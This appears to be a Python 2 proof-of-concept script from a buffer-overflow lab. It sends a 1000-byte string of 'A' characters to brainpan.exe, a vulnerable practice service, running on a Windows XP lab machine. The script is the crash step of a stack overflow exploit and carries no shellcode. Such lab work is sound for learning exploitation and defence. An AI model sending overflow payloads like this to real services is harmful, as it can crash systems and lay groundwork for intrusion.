#!/usr/bin/python
 
import socket,sys

payload = "\x41"*1000

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    s.connect(('192.168.1.136',9999)) # IP of WinXP SP3 machine running brainpan.exe
except:
    print "[-] Connection failed! Noob!"
    sys.exit(0)
 
s.recv(1024)
s.send(payload)